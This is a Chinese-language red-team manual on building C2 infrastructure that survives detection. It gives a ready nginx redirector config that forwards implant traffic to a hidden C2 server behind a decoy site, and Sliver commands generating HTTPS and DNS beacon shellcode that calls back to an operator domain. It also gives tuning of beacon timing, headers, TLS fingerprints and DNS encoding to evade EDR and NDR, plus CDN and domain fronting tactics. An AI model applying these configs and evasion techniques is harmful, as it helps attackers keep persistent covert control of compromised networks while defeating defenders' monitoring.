# C2 基础设施实战手册

被 `c2-framework-ops` 引用。

> 核心命题：**C2 能不能活下来，取决于基础设施，不是取决于 implant 的质量。**
> 同一个 implant，直连 C2 服务器 30 分钟被拦；走正确架构能活几周。

---

## 一、三层架构：为什么 redirector 不是可选项

### 失败案例（最常见的形态）

```text
implant 直接回连 203.0.113.5:443
→ 首次心跳即被 NDR 看到「内网主机访问陌生境外 IP」
→ 或被威胁情报标记（新 VPS IP + 非常规端口）
→ 防守方封 IP → 全部 implant 同时失联
→ 而且这个 IP 从此进黑名单，下次演练直接用不了
```

**判据**：**任何直连 C2 的部署都是短命的**。不是"可能被封"，是"一定会在某个时间点被封"。
问题只在于：被封时你有多少 implant 会一起死。

### 正确架构

```text
                    ┌─────────────────┐
   implant ────────→│  redirector #1  │──┐
     │              │  203.0.113.10   │  │
     │              └─────────────────┘  │
     │              ┌─────────────────┐  ├──→ ┌──────────────┐
     └──────────────│  redirector #2  │──┘    │  C2 server   │
       (备用域)      │  203.0.113.11   │       │  10.0.0.5    │
                    └─────────────────┘       │ (不暴露公网)  │
                                              └──────────────┘
```

**关键设计点**：

| 设计 | 为什么 |
| --- | --- |
| C2 server 不暴露公网 | 被封的只是 redirector，换一个就恢复 |
| redirector 无状态 | 被封了重建成本接近零（只要 nginx 配置 + 证书） |
| 域名与 redirector 解耦 | 封域名换域名，封 IP 换 IP，互不影响 |
| 有多个 redirector | implant 配了 fallback，主通道断了自动切 |

**验伤（架构是否真的隔离）**：

```bash
# 从公网扫 C2 server 所在的 IP，应该完全没有开放端口
nmap -Pn -p- <C2_REAL_IP> --min-rate 500
# 判据：所有端口 filtered/closed = 隔离到位
# 有一条 open = 架构破了（implant 可能绕过 redirector 直连）
```

---

## 二、域名选择：这是最容易被忽略的一环

### 判据表

| 检查项 | 阈值 | 后果 |
| --- | --- | --- |
| 域名年龄 | **< 30 天 = 高危** | 大量 SEG/NDR 对「新注册域名」直接打标签 |
| 历史信誉 | 进过任意黑名单 | 永久污点，基本无法洗白 |
| TLD | `.xyz`/`.top`/`.tk` = 高危 | 这些 TLD 的滥用率高，默认信誉差 |
| 证书类型 | Let's Encrypt DV | 中性（够用；EV 反而显眼） |
| 是否有正常网站 | 有 = 加分 | 空壳域名是红旗 |

```bash
DOMAIN="cdn.your-domain.com"

# 1) 年龄
whois "$DOMAIN" | grep -iE "creation date|created"

# 2) 黑名单（返回 127.0.1.x = 已列入）
dig +short "$DOMAIN.dbl.spamhaus.org" A
dig +short "$DOMAIN.multi.surbl.org" A

# 3) 威胁情报
curl -s "https://urlhaus-api.abuse.ch/v1/host/" -d "host=$DOMAIN" | head -c 300

# 4) 是否被分类为「可疑」（很多网关用商业分类库）
# 免费可查：https://www.virustotal.com/gui/domain/<domain>
```

### 域名形态的选择

| 形态 | 检出率 | 成本 | 适用 |
| --- | --- | --- | --- |
| `cdn.<你自己的老域名>` | **最低** | 低（子域免费） | **首选**：老域名有历史信誉 |
| `<随机词>.com`（新注册） | 高 | 低 | 不推荐 |
| typosquat（仿目标） | 中 | 低 | 钓鱼（不是 C2）用；C2 不需要像目标 |
| 云服务子域（`*.azurewebsites.net`） | **低** | 极低 | 借云厂商信誉；但云厂商会因滥用封号 |

**判据（最实用的一条）**：**用你已有的老域名开子域，比新买域名好得多**。
子域继承父域的信誉，且不需要额外注册。

---

## 三、redirector 的三种实现（按隐蔽性排序）

### 3.1 nginx 反代 + UA 过滤（最常用）

```nginx
# /etc/nginx/sites-available/c2-redirector
map $http_user_agent $is_implant {
    default                                   0;
    "~*Mozilla/5.0 \(Windows NT 10.0; Win64"  1;   # implant 的 UA
}

server {
    listen 443 ssl http2;
    server_name cdn.your-domain.com;

    ssl_certificate     /etc/letsencrypt/live/cdn.your-domain.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/cdn.your-domain.com/privkey.pem;
    # 用真浏览器的 TLS 配置，避免 JA3 差异
    ssl_protocols       TLSv1.2 TLSv1.3;
    ssl_ciphers         ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:...;

    location /api/v1/updates {
        if ($is_implant = 0) {
            return 302 https://www.cloudflare.com;      # 非 implant → 真网站
        }
        proxy_pass https://C2_REAL_IP:443;
        proxy_ssl_verify off;
        proxy_set_header Host $host;
        proxy_set_header X-Real-IP $remote_addr;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
        proxy_buffering off;                              # 长轮询必须关
    }

    location / {
        root /var/www/decoy;                              # 假站
        index index.html;
    }
}
```

**判据（这一步最关键）**：**假站必须看起来正常**。
放一个真能打开的静态页（哪怕只是 "CDN Status: OK"），不要留 nginx 默认页 ——
默认页是最明显的特征。

### 3.2 CDN 前置（Cloudflare / Fastly）

```text
把你的 redirector 藏在 CDN 后面：
  implant → Cloudflare → 你的 redirector → C2

优点：
  · implant 看到的是 Cloudflare 的 IP（信誉极高，不会封）
  · 你的真实 IP 完全不暴露
  · 免费套餐就够用

缺点 / 风险：
  · **Cloudflare 的 ToS 禁止 C2 用途**，被举报会封号（连带你的整个 CF 账号）
  · 免费版的 TLS 指纹是 Cloudflare 的（不是你的），反而更容易被指纹识别归类

判据：只在授权演练、且不使用 CF 的生产账号时用。商业演练不要碰这条。
```

### 3.3 域名前置（Domain Fronting）

```text
原理：TLS SNI 写 CDN 允许的域名（如 allowed.example.com），
      HTTP Host 头写你的真实域名。
     CDN 按 SNI 转发，到后端再按 Host 路由。

现状（重要）：
  · Cloudflare / AWS CloudFront / Google 都已封堵（2020 年后）
  · 仍有少数 CDN 可用，但极不稳定，且需要实测
  · 现代 NDR 对「SNI 与 Host 不一致」有专门检测

判据：**不要把它当主力方案**。它是"实在没别的路"时的最后手段，
且上线前必须实测目标 CDN 还认不认。
```

---

## 四、profile 调优：决定能不能过 EDR

### 4.1 三个必改项（默认 profile 一定被识别）

```text
默认 profile 的特征全部进了公开检测规则（Sigma/YARA/各厂商的 C2 检测）。
所以「用默认配置」=「当场被抓」。必改的三项：

① 心跳间隔（默认常 5-10s）
   → 改 ≥60s。理由：固定短间隔是最强的 C2 特征（真人不这么操作）。
② 抖动（默认常 0）
   → 改 ≥30%。理由：真人的流量间隔有天然抖动，机器没有。
③ URI 路径（默认 /beacon、/gate.php、/submit.php）
   → 改成业务路由形态（/api/v1/updates、/static/js/app.<hash>.js）。
```

### 4.2 Sliver 的具体参数

```bash
# 生成一个「CDN 心跳」形态的 HTTP profile
sliver > profiles new --profile-name cdn-beacon --format shellcode http \
  --http-c2-url "https://cdn.your-domain.com/api/v1/updates" \
  --http-c2-interval 60s \
  --http-c2-jitter 35 \
  --http-c2-user-agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"

# 校验 profile 真的生效（看生成的配置）
sliver > profiles
```

**判据**：`interval` 与 `jitter` 是写在 implant 里的常量，
改 profile 后**必须重新 generate implant** —— 旧 implant 不会用新 profile。

### 4.3 流量形态的验证（自己验，别猜）

```bash
# 抓自己 redirector 的流量，跟真浏览器对比
tcpdump -i eth0 -w c2.pcap 'tcp port 443' &
# ... 等几个心跳 ...
tshark -r c2.pcap -Y "http.request" -T fields \
  -e http.request.method -e http.request.uri -e http.user_agent | head

# 判据对照表：
#   真浏览器的请求：URI 多样、有 Referer、有 Accept-Language、有 sec-ch-ua
#   C2 的请求：URI 固定、无 Referer、无 Accept-Language、UA 完整但其他头缺失
```

**这条最容易自欺**：UA 改对了 ≠ 流量像浏览器。
**UA 之外的 header 缺失（Accept / Accept-Language / sec-ch-ua）是更明显的特征。**

### 4.4 JA3/JA4 指纹（最硬的检测点）

```text
TLS 握手有指纹（JA3/JA4），由「TLS 版本 + 密码套件列表 + 扩展列表」算出。
  · Go 写的 implant（Sliver）→ Go 的 TLS 栈指纹
  · Java 写的（CS）→ Java 的 TLS 栈指纹
  · 两者都 ≠ Chrome 的指纹

判据：**内容伪装做得再好，TLS 指纹不对一样能被归类**。
能不能改？理论可以（用 uTLS 之类伪造 ClientHello），但成本很高。
实用策略：**选一个「目标环境里本来就大量存在」的指纹**。
  例：目标内网有大量 Go 服务 → Sliver 的 Go 指纹反而不显眼。
```

---

## 五、Fallback 通道（主通道断了不能全死）

```text
设计原则：implant 配 ≥2 个回连通道，按顺序试。
  · 主：HTTPS（cdn.your-domain.com）
  · 备：DNS（dns.your-domain.com）
  · 再备：非标准端口（443 之外的某个开放端口）

判据：**每个通道用独立的域/端口**。同一个域的两个 URI 不算 fallback（域被封一起死）。
```

```bash
# Sliver 的 DNS C2（备用通道）
sliver > profiles new --profile-name dns-fallback --format shellcode dns \
  --dns-c2-domains dns.your-domain.com \
  --dns-c2-canary dns-backup.your-domain.com
```

**DNS C2 的检测点（必须控制）**：

| 特征 | 正常 DNS | C2 DNS | 怎么缓解 |
| --- | --- | --- | --- |
| 查询频率 | 有缓存，低频 | 持续查询 | 拉长间隔（≥60s） |
| 子域长度 | 短（正常域名） | 长（base64 编码） | 限单次 ≤200 字节 |
| 子域熵 | 低 | 高 | 用 base32 替代 base64（熵更低） |
| 记录类型 | A/AAAA 为主 | TXT 多 | 混用 A 记录传数据（慢但隐蔽） |

---

## 六、常见坑（每一条都踩过）

1. **redirector 上留了 C2 的特征** —— 比如 nginx 的 `server_tokens on` 暴露版本、
   或者 redirector 上开了 C2 的管理端口。**redirector 必须是一个"干净的 Web 服务器"**。
2. **假站是 nginx 默认页** —— 一眼就看出来。放一个真能打开的静态页。
3. **只配了一个通道** —— 主通道一断全部失联。必须有 fallback。
4. **改 profile 后忘了重新 generate** —— 旧 implant 还用旧参数。
5. **只改 UA 不改其他 header** —— UA 对了但缺 Accept/Accept-Language，比不改更显眼
   （因为"UA 说是 Chrome 但行为不像 Chrome"是强异常）。
6. **心跳太短** —— 5s 间隔 = 教科书式 C2。改 ≥60s。
7. **new domain + new VPS + Let's Encrypt** —— 这个组合本身就是威胁情报的标准画像，
   会被自动打标签。用老域名开子域能显著改善。
8. **忘记录 redirector 日志** —— 演练报告要「对方有没有发现」，
   redirector 的访问日志是唯一能证明「有非 implant 流量来过」（= 被扫过）的证据。
9. **收尾不清理基础设施** —— VPS 不释放、域名不吊销，下次演练这些资产全是负资产。